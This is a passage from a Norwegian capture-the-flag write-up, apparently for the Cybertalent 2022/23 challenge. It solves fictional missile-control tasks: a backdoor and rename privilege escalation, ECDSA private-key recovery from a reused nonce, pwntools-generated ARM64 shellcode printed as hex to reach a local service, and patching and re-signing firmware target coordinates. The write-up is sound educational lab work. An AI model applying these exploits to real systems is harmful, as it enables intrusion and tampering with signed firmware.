│   5 |      13 | 1800.00 |  3989809.15 |  1190414.03 |  4822237.90 | shy-cock │
│   5 |      14 | 1200.00 |  5437633.32 | -1356240.55 |  3030246.93 | the-boot │
│   5 |      15 | 1500.00 |  4511619.77 |   898015.45 |  4407776.80 | cut-fuel │
│   5 |      16 | 1600.00 |  4367306.66 |   953423.03 |  4539521.79 | one-boom │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│ FLAG| bc23d07612ac5bb9aa1b0a4e612ff275                                       │
└──────────────────────────────────────────────────────────────────────────────┘
```

```text
Oppgave:  2.12_missile_targets
Svar:     bc23d07612ac5bb9aa1b0a4e612ff275
Poeng:    3

Bra jobba! Dette må være kontrollsystemet til missilene. Målparametrene er allerde lagt inn og sikter på mange vestlige byer!
Dette er viktig informasjon som vi har levert videre til våre oppdragsgivere. Analytikerene våre har plottet målene for deg, sjekk oppdragsmappen.
Som du forstår er det ekstremt viktig å forhindre dette!

Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg
```
![Worst case scenario](images/worst_case_scenario.jpg)

---

## 2.13_findflag

`konekt` tillater oss å laste ned firmware som ligger på serveren. Dette er filene som ligger der fra før:

```text
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                         list │
╞══════════════════════════════════════════════════════════════════════════════╡
│ filename                                                            |   size │
│ --------------------------------------------------------------------+------- │
│ missile.1.3.37.fw                                                   | 160964 │
│ server-software.tar.xz                                              |1209804 │
└──────────────────────────────────────────────────────────────────────────────┘
```

Om vi laster ned og pakker ut `server-software.tar.xz`, så får vi ei binærfil som heter `fracture`. 
Dette er programvaren som kjører på `mad`. 

Planen er å reversere denne, og finne en måte å elevere privilegiet vårt. Jeg brukte Ghidra til dette.

I funksjonen `ui_read_key()` finner vi følgende:

```C
input = read(*(_session + 1), &read_buf, 1);
if (input == 1) {
    _history.0 = read_buf | _history.0 << 8;
    if (_history.0 == 0x726f6f646b636162) {
        **_session = **_session ^ 2;
}
```

Den leser en enkelt byte med data fra `read()`, og lagrer den i en buffer kalt `read_buf`. 
Deretter utfører den en bitvis venstre skyving på `_history.0` før den ORer den med `read_buf`. Resultatet blir lagret tilbake i `_history.0`.
Lettere sagt: de siste 8 karakterene vi har skrevet inn er lagret i `_history.0`.

`0x726f6f646b636162` er hex for `roodkcab`, som er backdoor baklengs.
Når `_history.0` inneholder den verdien, så blir privilegiet vår forhøyet til `Developer`.

Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som er lett å utnytte, men vanskelig å forklare), så får vi `SYSTEM` privilegier om vi kaller oss noe som ikke er alfanumerisk. 
Jeg brukte `!`.

Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp et flott bilde:

```sh
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                         MAIN │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ p: program                                                                   │
│ m: missile                                                                   │
│ f: firmware                                                                  │
│ u: user                                                                      │
└──────────────────────────────────────────────────────────────────────────────┘
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                     PROGRAMS │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ l: list programs                                                             │
│ s: show program                                                              │
│ r: run program                                                               │
└──────────────────────────────────────────────────────────────────────────────┘
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                list programs │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ filename                                                            |   size │
│ --------------------------------------------------------------------+------- │
│ findflag.prg                                                        |    254 │
│ telemetry.prg                                                       |    212 │
│ uid.prg                                                             |    148 │
└──────────────────────────────────────────────────────────────────────────────┘
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                     PROGRAMS │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ l: list programs                                                             │
│ s: show program                                                              │
│ r: run program                                                               │
└──────────────────────────────────────────────────────────────────────────────┘
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                  run program │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ program name > findflag.prg                                                  │
```

![2.13_flag](images/2.13_flag.png)

```text
Kategori: 2. Oppdrag
Oppgave:  2.13_findflag
Svar:     bc05429e668f76f0cb22b53ca900e447
Poeng:    4

Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?
```

---

## 2.14_multiplier

`history` viste oss dette:

```bash
1  ls -lah
2  which signer
3  signer --help
4  echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
5  rm test.txt
6  konekt
7  signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
8  mv missile.1.3.37.fw_signed missile.1.3.37.fw
9  konekt
10 rm privkey.pem missile.1.3.37.fw
```

`signer` blir brukt for å signere to filer, `test.txt` og `missile.1.3.37.fw`. Dette gjøres med en private key, `privkey.pem`, som blir slettet etter bruk.

Hjelp-menyen til `signer` nevner ECDSA, og hinter til at secp256k1-kurven blir benyttet:

```bash
signer --help
# Sign a file with ECDSA
# 
# Usage: signer [OPTIONS] --file-name <FILE_NAME> --key-file <KEY_FILE>
# 
# Options:
#   -f, --file-name <FILE_NAME>    Path to the file to sign
#   -k, --key-file <KEY_FILE>      PEM-file containing the secp256k1 private key
#   -r, --rng-source <RNG_SOURCE>  RNG seed source (one of Clock, Urandom) [default: Urandom]
#   -h, --help                     Print help information
```

Jeg lagde min egen privatnøkkel, signerte to filer med forskjellig innhold, og sammenlignet signaturene:

```bash
openssl ecparam -genkey -name secp256k1 -out privkey.pem -param_enc explicit
echo -n aaaaaaaaaaaaaaaa > a.txt && signer --file-name a.txt --key-file privkey.pem --rng-source urandom
# File size: 16 bytes
# Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 101470930953263482905196496644008688681262853128827165933802638504190043123950 }
echo -n bbbbbbbbbbbbbbbb > b.txt && signer --file-name b.txt --key-file privkey.pem --rng-source urandom
# File size: 16 bytes
# Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 89169711667094524674132738496910071433093664457918580439307144153630819379727 }

cat a.txt_signed | hd
# 00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
# 00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
# 00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
# 00000030  e0 56 82 fc 14 07 3f c8  7e db 80 9d 79 af 25 c0  |.V....?.~...y.%.|
# 00000040  84 7d 1b 1e 3b 49 6b bd  cf 18 69 60 8c 86 70 ee  |.}..;Ik...i`..p.|

cat b.txt_signed | hd
# 00000000  62 62 62 62 62 62 62 62  62 62 62 62 62 62 62 62  |bbbbbbbbbbbbbbbb|
# 00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
# 00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
# 00000030  c5 24 44 ad b4 c3 94 4c  4e 7e 72 35 cf ee 6c 08  |.$D....LN~r5..l.|
# 00000040  95 b3 f6 b3 fe 63 76 00  2a ec 4b ee 1b 5e 6a 0f  |.....cv.*.K..^j.|
```

En ECDSA-signatur består vanligvis av `r` og `s`, som hver er 32 bytes:

```c
struct ECDSA_Signature {
    uint32_t r;
    uint32_t s;
};
```
Vi kan se at `r` har samme verdi over flere signeringer. Dette er veldig dårlig kryptografimessig, men veldig bra for oss. `r = k * G`, hvor `k` er tiltenkt å være en tilfeldig verdi hver gang. Siden den er statisk er det mulig for oss å regne ut privatnøkkelen.

Jeg prøvde å reverse-engineere `signer` for å finne ut hvorfor dette skjedde, men det ga meg ingenting (bortsett fra redusert livsgnist av å måtte reversere kompilert Rust-kode).

Lastet ned `missile.1.3.37.fw` og sammenlignet signaturen med `test.txt_signed` for å sjekke om det samme fenomenet hadde skjedd ved den tidligere signeringen:

```bash
tail -c 64 test.txt_signed | hd
# 00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
# 00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
# 00000020  36 8b f0 ed b4 2c 04 ac  d8 64 9b aa d7 c4 fd 9b  |6....,...d......|
# 00000030  23 73 db 47 3d 61 32 94  4b 80 0b 6d 7e ce 7d 16  |#s.G=a2.K..m~.}.|

tail -c 64 missile.1.3.37.fw | hd
# 00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
# 00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
# 00000020  b7 09 74 8b 70 f4 18 46  e6 32 af c7 04 f3 8d 9c  |..t.p..F.2......|
# 00000030  53 fb 50 94 a3 c8 6f 2f  da 97 a7 41 3e 7a 44 90  |S.P...o/...A>zD.|
```

Herlig! `r`-verdiene er identiske.

Brukte Python for å kalkulere privatnøkkelen. 
Skriptet ligger [her](crypto/same_k_recover_privkey.py). Matten er basert på [denne siden](https://asecuritysite.com/ecdsa/ecd5):

```C
r1: 17211542253021086784505659283610982505828311641993563606189014132281847868803
s1: 24672148393105490807172642003357033928250921460564351943433773766105747062038
h1: 53558879788905805671068674208647963498387261713450127955763892603805320644988

r2: 17211542253021086784505659283610982505828311641993563606189014132281847868803
s2: 82789957276224960427052465459370715358048161416963169362889803353386861085840
h2: 27567713526363642182323369520225315448427582916364134856575038991303938254239

Private key: 114798114433974422739242357806023105894899569106244681546807278823326360043821
```

Flagget er privatnøkkelen.

```text
Kategori: 2. Oppdrag
Oppgave:  2.14_multiplier
Svar:     114798114433974422739242357806023105894899569106244681546807278823326360043821
Poeng:    5

Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin. Som det kjente ordtaket går -- "Never roll your own crypto". La oss håpe denne nøkkelen kan brukes til noe nyttig :)
```

---

## 2.15_firmware_staged

Med litt reversering av `/usr/bin/konekt` fant man fort ut at det bare var en wrapper for å kommunisere med en tjeneste som kjørte på serveren `mad`, port 1337.

Jeg lagde [4 skript](konekt_scripts/) for å interagere med `mad:1337` via Python sockets. Dette tok tiden for å laste opp/ned filer fra flere minutter ned til noen sekunder. 
Jeg kunne også lett kopiere og lime inn shellcoden som jeg genererte på min lokale maskin til `aurum`. Dette gjorde feilsøkingen/krasjingen av shellcoden mye raskere.

I kildekoden til `fracture` finner vi denne interessante funksjonen:

```c
int kontrolr_command(char *param_1) {

    int iVar1;
    int iVar2;
    size_t __n;
    size_t sVar3;
    addrinfo *paVar4;
    addrinfo *local_38;
    addrinfo local_30;
  
    local_30._0_8_ = 0;
    local_30._8_8_ = 1;
    local_30._16_8_ = 0;
    local_30.ai_addr = 0x0;
    local_30.ai_canonname = 0x0;
    local_30.ai_next = 0x0;
    iVar1 = getaddrinfo("127.0.0.1","1025",&local_30,&local_38);
    if (-1 < iVar1) {
    iVar1 = -1;
    for (paVar4 = local_38; paVar4 != 0x0; paVar4 = paVar4->ai_next) {
        iVar1 = socket(paVar4->ai_family,paVar4->ai_socktype,paVar4->ai_protocol);
        if (-1 < iVar1) {
        iVar2 = connect(iVar1,paVar4->ai_addr,paVar4->ai_addrlen);
        if (iVar2 == 0) break;
        close(iVar1);
        }
    }
    freeaddrinfo(local_38);
    if (iVar1 != -1) {
        __n = strlen(param_1);
        sVar3 = write(iVar1,param_1,__n);
        if (__n == sVar3) {
        return iVar1;
        }
        close(iVar1);
    }
    }
    return -1;
}
```

Den sender en kommando (`param_1`) til en tjeneste som lytter på `localhost:1025` og leser tilbake svaret.
Siden vi kan kjøre hvilken som helst kode i konteksten av `fracture` så kan jo vi gjøre akkurat det samme, bare bedre.

Ett problem er at den forventer `ARM64` instruksjonssettet, kontra `x86_64` som vi vanlige dødlige er vant med. Jeg har aldri rørt ARM64 før. Den eneste erfaringen jeg har med det er via en kompis som måtte jobbe med det, og han nevnte at han "*savnet vanlig assembly*".

Heldigvis er årstallet 2022/23. Smarte individer har gjort mye bra arbeid. Spesielt de som har laget `shellcraft`-modulen til `pwntools`. Med `shellcraft` er det å lage shellcode for de fleste instruksjonssett nesten like enkelt som å skrive C-kode. 

Vi ønsker da å sende en tilfeldig kommando til `localhost:1025`, og se hva vi får tilbake:

```python
from pwn import *

context.binary = ELF("/home/kali/cybertalent/fracture", checksec=False)
command = b"give_flag_pls"

shellcode = shellcraft.connect("127.0.0.1", 1025)
shellcode += shellcraft.write("x12", command, len(command))
shellcode += shellcraft.read("x12", "sp", 0x100)
shellcode += shellcraft.mov("x11", "x0")
shellcode += shellcraft.close("x12")
shellcode += shellcraft.write(0x4, "sp", "x11")
shellcode += shellcraft.exit(69)

compiled_shellcode = asm(shellcode)
print("Length of shellcode:", len(compiled_shellcode))
print(enhex(compiled_shellcode))
```

```bash
python3 /home/kali/cybertalent/generate_arm_shellcode.py
# Length of shellcode: 184
# 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ee2c8dd2ceaeacf2eecbccf28e2decf2efec8bd20f8eadf26f0ec0f2ee3fbfa9e1030091e0030caaa20180d2080880d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4200080d2a80b80d2010000d4
python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ee2c8dd2ceaeacf2eecbccf28e2decf2efec8bd20f8eadf26f0ec0f2ee3fbfa9e1030091e0030caaa20180d2080880d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080d4200080d2a80b80d2010000d4
# ping    is service listening?
#         arguments: None
#         response: 'pong'
# list    list submarines and missiles
#         arguments: None
#         response: text
# tele    show telemetry when missiles are in flight
#         arguments: None
#         response: text
# flsh    stage missile firmware to be flashed
#         arguments: ['u16le:submarine', 'u16le:missile', 'binary:firmware']
#         response: text
```

Den forstod ikke kommandoen den ble tilsendt, så den svarte med en generisk hjelp-meny. 

I kildekoden til `fracture` ser vi tilfeller hvor `list` og `tele` blir brukt.
`ping` er akkurat like simpel som den virker, så vi står igjen med `flsh`.

Vi har et valg om å oppdatere firmwaren til missilene gjennom `konekt`, men dette feiler da den ikke finner `flash.prg`:

```text
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                         MAIN │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ p: program                                                                   │
│ m: missile                                                                   │
│ f: firmware                                                                  │
│ u: user                                                                      │
└──────────────────────────────────────────────────────────────────────────────┘
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                     MISSILES │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ l: list submarines with missiles                                             │
│ s: simulate all missile flights                                              │
│ f: upgrade missile firmware                                                  │
└──────────────────────────────────────────────────────────────────────────────┘
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                     upgrade missile firmware │
╞══════════════════════════════════════════════════════════════════════════════╡
│                                                                   [AD----SO] │
│ firmware file name > missile.1.3.37.fw                                       │
│ submarine > 1                                                                │
│ missile > 1                                                                  │
│ flash.prg failed with errno:2 (No such file or directory)                    │
└──────────────────────────────────────────────────────────────────────────────┘
```

Jeg brukte følgende shellcode for å leter etter `flash.prg`, i tilfelle den fantes et annet sted i filstrukturen som vi kunne aksessere:

```python
from pwn import *

context.binary = ELF("/home/kali/cybertalent/fracture")

shellcode =  shellcraft.open("..") # Endre denne til mappen du vil sjekke
shellcode += shellcraft.getdents64("x0", "sp", 0x321)
shellcode += shellcraft.write(0x4, "sp", 0x321)
shellcode += shellcraft.exit(69)

print(enhex(asm(shellcode)))
```

Jeg fant ingenting. Vi er dessverre sperret inne i et fengsel gjennom `chroot`, og har tilgang til veldig lite.

Det neste logiske steget er da å lage en "*egen*" versjon av `flash.prg`.
Basert på hvordan `flsh` ønsket argumentene kom jeg frem til dette:

```python
from pwn import *

context.binary = ELF("/home/kali/cybertalent/fracture")

command = b"flsh"
submarine = p16(0)
missile = p16(0)
full_command = command + submarine + missile
firmware = "/firmware/missile.1.3.37.fw"

shellcode = shellcraft.connect("127.0.0.1", 1025)
shellcode += shellcraft.write("x12", full_command, len(full_command))
shellcode += shellcraft.cat(firmware, "x12")
shellcode += shellcraft.read("x12", "sp", 0x100)
shellcode += shellcraft.mov("x11", "x0")
shellcode += shellcraft.close("x12")
shellcode += shellcraft.write(0x4, "sp", "x11")
shellcode += shellcraft.exit(69)

compiled_shellcode = asm(shellcode)
print("Length of shellcode:", len(compiled_shellcode))
print(enhex(compiled_shellcode))
```

Legg merke til at jeg ikke har skrevet et fnugg av ARM64 assembly. Det er jeg fornøyd med.

```bash
python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ce8c8dd26e0eadf2ee0f1ff8e1030091e0030caa020180d2080880d2010000d4aecc85d22ec6a5f26ec6c5f26ee6e6f2cfc58cd2ef0ea0f2ee3fbfa9eec58cd22e4daef2aeedcef22e4ceef2afec85d2af2dadf26f6ecef22f8dedf2ee3fbfa980f39fd2e0ffbff2e0ffdff2e0fffff2e1030091e2031faa080780d2010000d4e10300aae0030caae2031faae3ff9fd2e3ffaff2e80880d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4a00880d2a80b80d2010000d4
[+] FLASH 0:00 274c4
[+] 7f454c46010101000000000000000000020028000100000025c3000034000000...
```

`7f454c46` er filsignaturen til en ELF-fil, så vi ser at firmwaren ble lastet opp. 
Basert på erfaringen jeg har med pwn så er det mulig at vi leser tilbake for tidlig, før den har rukket å gjøre seg ferdig.
Jeg la til en `nanosleep(sec=2)` etter `cat` og før `read`:

```python
<...>
shellcode += shellcraft.pushstr("\x02".ljust(0x10, "\x00"), append_null=False)
shellcode += shellcraft.nanosleep("sp")
<...>
```

```bash
python3 /home/kali/cybertalent/generate_arm_shellcode.py
# Length of shellcode: 316
# 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ce8c8dd26e0eadf2ee0f1ff8e1030091e0030caa020180d2080880d2010000d4aecc85d22ec6a5f26ec6c5f26ee6e6f2cfc58cd2ef0ea0f2ee3fbfa9eec58cd22e4daef2aeedcef22e4ceef2afec85d2af2dadf26f6ecef22f8dedf2ee3fbfa980f39fd2e0ffbff2e0ffdff2e0fffff2e1030091e2031faa080780d2010000d4e10300aae0030caae2031faae3ff9fd2e3ffaff2e80880d2010000d44e0080d2ef031faaee3fbfa9e0030091e1031faaa80c80d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4a00880d2a80b80d2010000d4
python3 upload_and_run.py 400080d2210080d2e2031faac81880d2010000d4ec0300aa4e0080d28e20a0f2ee0fc0f20e20e0f2ee0f1ff8e0030caae1030091020280d2681980d2010000d4ce8c8dd26e0eadf2ee0f1ff8e1030091e0030caa020180d2080880d2010000d4aecc85d22ec6a5f26ec6c5f26ee6e6f2cfc58cd2ef0ea0f2ee3fbfa9eec58cd22e4daef2aeedcef22e4ceef2afec85d2af2dadf26f6ecef22f8dedf2ee3fbfa980f39fd2e0ffbff2e0ffdff2e0fffff2e1030091e2031faa080780d2010000d4e10300aae0030caae2031faae3ff9fd2e3ffaff2e80880d2010000d44e0080d2ef031faaee3fbfa9e0030091e1031faaa80c80d2010000d4e0030caae1030091022080d2e80780d2010000d4eb0300aae0030caa280780d2010000d4800080d2e1030091e2030baa080880d2010000d4a00880d2a80b80d2010000d4
# [+] FLASH 0:00 274c4
# [+] 7f454c46010101000000000000000000020028000100000025c3000034000000...
# [+] Signature OK
# [+] FLAG: 7f34ada436059e84fea23eb48c91024c9203638b
```

Hurra! Litt testing tilsa at en `nanosleep` på ett sekund for lite til å fullføre hver gang, men to sekunder var midt i blinken.

```text
Kategori: 2. Oppdrag
Oppgave:  2.15_firmware_staged
Svar:     7f34ada436059e84fea23eb48c91024c9203638b
Poeng:    5

Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Firmwaren ser ut til å være beskyttet av en form for signatursjekk. Hvis du klarer å finne en måte å bestå denne sjekken på så kan du levere det du finner med `scoreboard FUNN` for en liten påskjønnelse, hvis du ikke allerede har gjort det.
Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
Siden alle missilene i hver ubåt skal til samme mål, må firmware være identisk for hvert missil per ubåt.
```

---

## 2.16-20_submarine_0-4

Her ble det litt vanskelig.

Jeg begynte med å reverse-engineere `missile.1.3.37.fw`, som er en ELF 32-bit ARM binærfil.
Jeg brukte igjen Ghidra, da IDA kun støtter ARM om man er søkkrik.

I funksjonen `boot_banner()` kan vi se følgende:

```C
printk("*** Booting Zephyr OS build zephyr-v3.2.0-2532-g5fab7a5173f6 ***\n");
```

Zephyr OS er et real-time operativsystem laget for innebygde enheter, og best av alt; det er open-source. Det er en stor hjelp å kunne slå opp definisjonene på datastrukturer, funksjoner og datatyper mens man reverse-engineerer.

Jeg brukte en god stund på å navigere den dekompilerte koden, og stirret i timesvis på de forskjellige funksjonene til de ga noenlunde mening.

I "Memory Map"-visningen i Ghidra kan vi se et minnesegment som heter `.rocket_parameters`. 
Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12](#212_missile_targets).
`tof` er *Time of Flight*, altså flytiden. Begge disse to blir aksessert fra `armed_entry()`, mer spesifikt disse linjene av kode:

```C
zsl_vec_from_arr(&target, _target, param_3, 0, param_1);
DAT_200009b8 = target;
DAT_200009bc = PTR_target_vec_69c;
DAT_200009c4 = gc_init();
DAT_200009c4 = gc_set_initial_conditions(&DAT_200009b8, extraout_r1, _tof, DAT_00018f34);
```

Et raskt google-søk peker oss til [Zephyr Scientific Library](https://zephyrproject-rtos.github.io/zscilib/), som inneholder kildekoden for `zsl_vec_from_arr`, samt strukturen og datatypene:

```C
int zsl_vec_from_arr(struct zsl_vec* v, zsl_real_t* a)

struct zsl_vec {
    size_t sz;
    zsl_real_t *data;
};

typedef double zsl_real_t;
```

Viser seg at `_target` er et array bestående av 3 `zsl_real_t`, som er av datatypen `double`.
Brukte python til å unpacke bytene:

```python
import array

_target = [0x84, 0x02, 0xf0, 0xe5, 0x7a, 0x40, 0x4e, 0x41, 0x9c, 0x1f, 0xed, 0xbd, 0x9b, 0xec, 0xbf, 0xc0, 0x74, 0xf1, 0x9c, 0xd6, 0xcd, 0x05, 0x53, 0x41]
print(*array.array('d', bytearray(_target)))
```

Det ga følgende output:

```text
3965173.7963870186 -8172.608366794793 4986679.353329051
```

Det ser akkurat ut som target-verdiene for SUB:1 MIS:1 som dukket opp i listen over missiler! Vi er på rett spor.

Jeg brukte enda mer tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (*Earth-centered, Earth-fixed*) koordinater vi jobbet med.
For å dobbeltsjekke dette prøvde jeg å konvertere fra ECEF til lat/lon ved hjelp av konvertere på nett, men de ga et resultat som virket feil.

Så da spørte jeg pent ChatGPT om å lage en til meg:

```python
import math

def ecef_vector_to_lat_lon(vector):
    x, y, z = vector
    lon = math.atan2(y, x)
    hyp = math.sqrt(x ** 2 + y ** 2)
    lat = math.atan2(z, hyp)

    lat = lat * 180 / math.pi
    lon = lon * 180 / math.pi

    return lat, lon

_target = [3965173.80, -8172.61, 4986679.35]
print(*ecef_vector_to_lat_lon(_target))
```

Output:

```python
51.50986495591076 -0.11809202349170798
```

Plugger vi disse koordinatene inn i [Google Maps](https://www.google.no/maps/place/51%C2%B030'35.5%22N+0%C2%B007'05.1%22W/@51.5098683,-0.120286,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0xf5e2635478a5eaeb!8m2!3d51.509865!4d-0.118092) så havner vi midt i sentrum av London. Nice! 

Målet nå var å regne ut ECEF vektorene som tilsvarte lat/lon koordinatene vi fikk av oppdragsgiver.
Jeg endte opp med å bruke [Nvector](https://github.com/pbrod/Nvector) for å gjøre de geometriske kalkulasjonene:

```python
import nvector
import struct

target_coordinates = (24.1851, -43.3704)
sphere = nvector.FrameE(a=6371e3, f=0)

target = sphere.GeoPoint(latitude=target_coordinates[0], longitude=target_coordinates[1], z=0, degrees=True)
ecef_vectors = target.to_ecef_vector().pvector

print("Target ECEF vectors:", *ecef_vectors)
print("_target value:", struct.pack('d' * len(ecef_vectors), *ecef_vectors).hex())
```

Output:

```text
Target ECEF vectors: [4224766.3303444] [-3991030.54681077] [2610108.35568405]
_target value: d55c2495bf1d50412de5fd45fb724ec10c0e872ddee94341
```

Neste steg var å simulere missilet med den nye firmwaren:
* Patche bytene i `_target` ved hjelp av "Bytes"-visningen til Ghidra
* Lagre firmwaren og overføre den til `aurum`.
* Signere filen ved å bruke `signer` og `privkey.pem`
* Laste opp fila
* Lage shellcode som flashet ubåt 1 med vår nye firmware
* Utføre en simulering, og se hva som skjer

```bash
scp missile.1.3.38.fw login@cybertalent.no
ssh login@cybertalent.no
scp -i 2_oppdrag/sshkey_aurum missile.1.3.38.fw user@aurum:
ssh -i 2_oppdrag/sshkey_aurum user@aurum
signer --file-name missile.1.3.38.fw --key-file privkey.pem --rng-source urandom
python3 upload_file.py missile.1.3.38.fw
python3 upload_and_run.py <enhexed shellcode fra generate_arm_flash_submarine.py>
python3 init_simulation.py
```

Outputtet fra simuleringen blir dessverre altfor verbost til å vises. 
Missilet fløy i rett retning, men traff ikke målet. 
Jeg tenkte at dette var på grunn av at flytiden ikke stemte mtp. den lengre distansen missilet nå måtte fly.

Jeg endret da én byte i `_tof`, slik at tallverdien ble på ~69000. Dette gjorde at simuleringen brukte 10 timer, og missilet traff fortsatt ikke.
Kan ikke anbefales.

Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. 
Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, istedenfor å kalkulere den. 
Jeg hadde jo tross alt tilgang til dataen for 80 missiler hvor dette allerede var kalkulert.

De eksakte lat/lon koordinatene til ubåtene kunne man observere under simuleringen, så jeg slapp å approksimere disse ut ifra beskrivelsen gitt av oppdragsgiver.

Jeg lagde et [skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden.

```text
Distance: 348395.48975179956 - Time of Flight: 500.0 - Distance/TOF: 696.7909795035991
Distance: 500263.3985159643 - Time of Flight: 600.0 - Distance/TOF: 833.7723308599404
Distance: 511762.1047280655 - Time of Flight: 600.0 - Distance/TOF: 852.9368412134424
Distance: 520499.4149202836 - Time of Flight: 900.0 - Distance/TOF: 578.3326832447596
Distance: 590144.6263528519 - Time of Flight: 600.0 - Distance/TOF: 983.5743772547531
Distance: 732878.7025049966 - Time of Flight: 1300.0 - Distance/TOF: 563.7528480807666
Distance: 808640.5369362447 - Time of Flight: 1080.0 - Distance/TOF: 748.7412379039303
Distance: 863068.4010189358 - Time of Flight: 1080.0 - Distance/TOF: 799.1374083508665
Distance: 933003.5862811609 - Time of Flight: 1080.0 - Distance/TOF: 863.8922095195935
Distance: 945357.6059941095 - Time of Flight: 1080.0 - Distance/TOF: 875.3311166612125
Distance: 964152.5410666476 - Time of Flight: 1080.0 - Distance/TOF: 892.73383432097
Distance: 966287.4969199213 - Time of Flight: 1000.0 - Distance/TOF: 966.2874969199213
Distance: 981188.6638837567 - Time of Flight: 1080.0 - Distance/TOF: 908.5080221145896
Distance: 1009708.3154344284 - Time of Flight: 1080.0 - Distance/TOF: 934.91510688373
Distance: 1012135.9835278065 - Time of Flight: 1000.0 - Distance/TOF: 1012.1359835278065
Distance: 1019896.8575486206 - Time of Flight: 1080.0 - Distance/TOF: 944.3489421746486
Distance: 1041037.6111341281 - Time of Flight: 1100.0 - Distance/TOF: 946.3978283037528
Distance: 1082799.317533042 - Time of Flight: 1100.0 - Distance/TOF: 984.3630159391291
Distance: 1150927.3278368798 - Time of Flight: 1300.0 - Distance/TOF: 885.3287137206768
Distance: 1170456.4550821886 - Time of Flight: 1300.0 - Distance/TOF: 900.3511192939912
Distance: 1209191.039503127 - Time of Flight: 1200.0 - Distance/TOF: 1007.6591995859393
Distance: 1217874.0369089686 - Time of Flight: 1100.0 - Distance/TOF: 1107.1582153717895
Distance: 1224359.5574722323 - Time of Flight: 1200.0 - Distance/TOF: 1020.2996312268602
Distance: 1246719.4941068373 - Time of Flight: 1500.0 - Distance/TOF: 831.1463294045582
Distance: 1266109.9669538387 - Time of Flight: 1400.0 - Distance/TOF: 904.3642621098847
